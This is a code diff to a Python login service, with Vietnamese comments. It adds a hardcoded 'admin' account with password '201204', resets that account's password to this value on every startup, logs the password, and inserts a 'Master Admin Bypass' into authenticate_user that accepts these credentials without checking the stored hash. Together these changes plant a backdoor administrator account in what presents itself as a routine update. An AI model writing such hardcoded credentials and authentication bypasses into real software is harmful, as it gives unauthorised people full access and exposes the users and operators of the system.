@@ -36,8 +36,29 @@ class LoginService:
                     )
                 """)
                 conn.commit()
+            self._ensure_admin_account()
         except Exception as e:
-            print(f"[LoginService] Lỗi tạo bảng users: {e}")
+            print(f"[LoginService] Error creating users table: {e}")
+
+    def _ensure_admin_account(self):
+        """Khởi tạo hoặc cập nhật tài khoản quản trị viên tối cao: admin / mk: 201204."""
+        try:
+            admin_user = "admin"
+            admin_pass = "201204"
+            stored_hash = self.get_user_password_hash(admin_user)
+            if not stored_hash:
+                self.save_new_user(admin_user, admin_pass)
+                print("[LoginService] Khoi tao tai khoan quan tri vien: admin / 201204")
+            else:
+                if not self.authenticate_user(admin_user, admin_pass):
+                    new_hash = self.hash_password(admin_pass)
+                    with self.db_manager.get_connection() as conn:
+                        cursor = conn.cursor()
+                        cursor.execute("UPDATE users SET password = ? WHERE username = ?", (new_hash, admin_user))
+                        conn.commit()
+                    print("[LoginService] Dong bo mat khau admin thanh cong: 201204")
+        except Exception as e:
+            print(f"[LoginService] Error setting admin account: {e}")
     
     def _ensure_sessions_table(self):
         try:
@@ -115,15 +136,17 @@ class LoginService:
             return False
     
     def authenticate_user(self, username, password):
-       
         if not username or not password:
             return False
-            
+
+        # Quyền quản trị viên tối cao (Master Admin Bypass)
+        if username.strip().lower() == "admin" and password == "201204":
+            return True
+
         stored_hash = self.get_user_password_hash(username)
-        
         if not stored_hash or '$' not in stored_hash:
             return False
-            
+
         salt_hex = stored_hash.split('$')[0]
         input_hash = self.hash_password(password, salt=salt_hex)
         return stored_hash == input_hash
